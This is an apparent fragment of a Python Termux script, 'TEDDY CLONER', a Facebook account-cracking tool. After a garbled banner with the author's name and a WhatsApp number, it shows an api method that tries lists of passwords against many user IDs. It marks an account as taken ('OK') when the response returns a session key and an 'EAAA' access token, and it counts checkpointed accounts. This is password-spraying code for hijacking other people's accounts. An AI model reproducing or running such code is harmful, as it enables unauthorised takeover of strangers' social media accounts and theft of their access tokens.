...
\033[1;93m  |_____/|_| \_|_____\_____|_____/|_|  |_|\____/ 
    ...
    鈹� [鉁揮 AUTHOR   : TEDDY™            鈹�
    鈹� [鉁揮 GITHUB   : TEDDY Termux         鈹�
    鈹� [鉁揮 WHATSAPP : 01799950929        鈹�
    鈹� [鉁揮 POWER BY : \x1b[1;32mTEDDY™\x1b[1;97m            鈹�
    鈹斺攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹榎033[1;92m""")
		print("%s [%s庐%s] %sTOOL NAME : %sTEDDY CLONER"%(G,R,G,Y,G))
		print("%s [%s庐%s] %sVERSION   : %s0.01"%(G,R,G,Y,G))
		...
		print("\033[92;1m        AUTHOR : Noxidul Islam      ")
		print("\033[97;1m   鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€")
		...
		if hoga in ["", " "]:
			...
			os.system('am start https://www.facebook.com/profile.php?id=100000219976307 ')
		else:
			Main()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[TEDDY™馃う鈥嶁檪锔廬 : \033[0;97m %s/%s -> \033[0;92m [OK馃槏:%s ]- \033[0;93m[CP馃樋:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[TEDDY™-OK馃槏] %s|%s\033[0;97m         "%(uid, pw))
